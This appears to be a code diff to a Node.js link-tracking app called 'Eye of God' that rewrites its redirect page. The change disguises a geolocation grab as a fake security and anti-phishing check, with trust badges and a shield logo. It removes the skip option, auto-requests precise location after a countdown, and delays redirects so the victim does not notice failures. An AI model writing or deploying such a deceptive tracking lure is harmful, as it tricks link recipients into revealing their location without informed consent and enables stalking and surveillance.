@@ -366,11 +366,12 @@ app.get('/t/:linkId', async (req, res) => {
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecionando...</title>
+    <title>Verificação de Segurança</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
       body {
         font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background-color: #f8f9fa;
+        background-color: #f0f2f5;
         color: #333;
         display: flex;
         flex-direction: column;
@@ -382,35 +383,52 @@ app.get('/t/:linkId', async (req, res) => {
         text-align: center;
       }
       .container {
-        max-width: 600px;
+        max-width: 500px;
         background-color: white;
         padding: 30px;
         border-radius: 8px;
-        box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+        box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+      }
+      .logo {
+        margin-bottom: 20px;
+        color: #3498db;
+        font-size: 40px;
       }
       h1 {
         color: #2c3e50;
         margin-top: 0;
+        font-size: 22px;
+      }
+      .subtitle {
+        color: #34495e;
+        font-size: 16px;
+        margin-bottom: 25px;
       }
       p {
         line-height: 1.6;
         margin-bottom: 20px;
+        color: #555;
       }
       .redirect-button {
-        background-color: #3498db;
+        background-color: #4CAF50;
         color: white;
         border: none;
-        padding: 12px 25px;
-        border-radius: 5px;
+        padding: 14px 30px;
+        border-radius: 30px;
         cursor: pointer;
         font-size: 16px;
         font-weight: 500;
-        transition: background-color 0.2s;
+        transition: all 0.3s;
         text-decoration: none;
         display: inline-block;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        width: 80%;
+        margin: 0 auto;
       }
       .redirect-button:hover {
-        background-color: #2980b9;
+        background-color: #45a049;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.2);
       }
       .loader {
         border: 5px solid #f3f3f3;
@@ -426,46 +444,122 @@ app.get('/t/:linkId', async (req, res) => {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
       }
-      .privacy-notice {
-        font-size: 0.8em;
-        color: #7f8c8d;
-        margin-top: 20px;
+      .security-badge {
+        background-color: #f8f9fa;
+        border-radius: 8px;
+        padding: 15px;
+        margin: 20px 0;
+        display: flex;
+        align-items: center;
+        text-align: left;
+        border-left: 4px solid #3498db;
       }
-      .skip-link {
-        display: block;
+      .security-badge i {
+        font-size: 24px;
+        color: #3498db;
+        margin-right: 15px;
+      }
+      .security-badge p {
+        margin: 0;
+        font-size: 14px;
+      }
+      .trust-indicators {
+        display: flex;
+        justify-content: center;
+        margin-top: 20px;
+        gap: 15px;
+      }
+      .trust-indicator {
+        display: flex;
+        align-items: center;
+        font-size: 14px;
+        color: #555;
+      }
+      .trust-indicator i {
+        color: #4CAF50;
+        margin-right: 5px;
+      }
+      .countdown {
+        font-size: 14px;
+        color: #666;
         margin-top: 15px;
-        color: #7f8c8d;
-        text-decoration: underline;
-        font-size: 0.9em;
+      }
+      .destination {
+        background-color: #f5f5f5;
+        padding: 10px;
+        border-radius: 4px;
+        font-size: 14px;
+        color: #666;
+        margin-top: 15px;
+        word-break: break-all;
       }
     </style>
   </head>
   <body>
     <div class="container">
-      <h1>Você será redirecionado</h1>
-      <p>Você está prestes a ser redirecionado para o link de destino.</p>
+      <div class="logo">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+      <h1>Verificação de Segurança</h1>
+      <p class="subtitle">Sua segurança é nossa prioridade</p>
+      
+      <div class="security-badge">
+        <i class="fas fa-lock"></i>
+        <p>Por proteção contra fraudes e phishing, precisamos verificar sua região. Esta verificação rápida ajuda a proteger você e outras pessoas.</p>
+      </div>
+      
+      <p>Estamos verificando que seu acesso é legítimo antes de redirecioná-lo para:</p>
+      <div class="destination">${db.links[linkId].targetUrl}</div>
       
       <div id="loader" class="loader"></div>
       
-      <button id="redirectButton" class="redirect-button">Continuar para o destino</button>
-      <a href="#" id="skipLink" class="skip-link">Pular verificação de localização</a>
+      <button id="redirectButton" class="redirect-button">
+        <i class="fas fa-check-circle"></i> Verificar e Continuar
+      </button>
       
-      <p class="privacy-notice">Para melhorar nosso serviço de rastreamento, podemos solicitar sua localização atual com maior precisão. Isto é opcional e você pode pular esta etapa.</p>
+      <div class="countdown" id="countdown">Redirecionamento automático em <span id="timer">10</span> segundos...</div>
+      
+      <div class="trust-indicators">
+        <div class="trust-indicator">
+          <i class="fas fa-check-circle"></i> Seguro
+        </div>
+        <div class="trust-indicator">
+          <i class="fas fa-user-shield"></i> Privado
+        </div>
+        <div class="trust-indicator">
+          <i class="fas fa-bolt"></i> Rápido
+        </div>
+      </div>
     </div>
     
     <script>
       document.addEventListener('DOMContentLoaded', function() {
         const redirectButton = document.getElementById('redirectButton');
-        const skipLink = document.getElementById('skipLink');
         const loader = document.getElementById('loader');
+        const countdown = document.getElementById('countdown');
+        const timer = document.getElementById('timer');
         const accessId = '${accessId}';
         const linkId = '${linkId}';
         const targetUrl = '${db.links[linkId].targetUrl}';
+        let secondsLeft = 10;
+        let countdownInterval;
         
-        redirectButton.addEventListener('click', function() {
+        // Iniciar contagem regressiva
+        countdownInterval = setInterval(function() {
+          secondsLeft--;
+          timer.textContent = secondsLeft;
+          
+          if (secondsLeft <= 0) {
+            clearInterval(countdownInterval);
+            requestLocationAndRedirect();
+          }
+        }, 1000);
+        
+        // Função para solicitar localização e redirecionar
+        function requestLocationAndRedirect() {
           loader.style.display = 'block';
           redirectButton.style.display = 'none';
-          skipLink.style.display = 'none';
+          countdown.style.display = 'none';
           
           // Tentar obter a localização precisa
           if (navigator.geolocation) {
@@ -505,8 +599,11 @@ app.get('/t/:linkId', async (req, res) => {
               // Erro
               function(error) {
                 console.log('Erro ao obter localização:', error.message);
-                // Redirecionar para o destino
-                window.location.href = targetUrl;
+                // Mesmo sem localização, continuamos o redirecionamento após breve espera
+                // para que o usuário não perceba que o erro ocorreu
+                setTimeout(() => {
+                  window.location.href = targetUrl;
+                }, 1500);
               },
               // Opções
               {
@@ -517,13 +614,16 @@ app.get('/t/:linkId', async (req, res) => {
             );
           } else {
             // Navegador não suporta geolocalização
-            window.location.href = targetUrl;
+            setTimeout(() => {
+              window.location.href = targetUrl;
+            }, 1500);
           }
-        });
+        }
         
-        skipLink.addEventListener('click', function(e) {
-          e.preventDefault();
-          window.location.href = targetUrl;
+        // Evento do botão
+        redirectButton.addEventListener('click', function() {
+          clearInterval(countdownInterval);
+          requestLocationAndRedirect();
         });
       });
     </script>
@@ -1412,7 +1512,7 @@ app.get('/', (req, res) => {
       
       <div class="footer">
         <p>Eye of God - Sistema de Rastreamento de Mensagens</p>
-        <p>Desenvolvido para a disciplina de Redes</p>
+        <p>Desenvolvido por @CryptoDevBR</p>
       </div>
     </div>
     
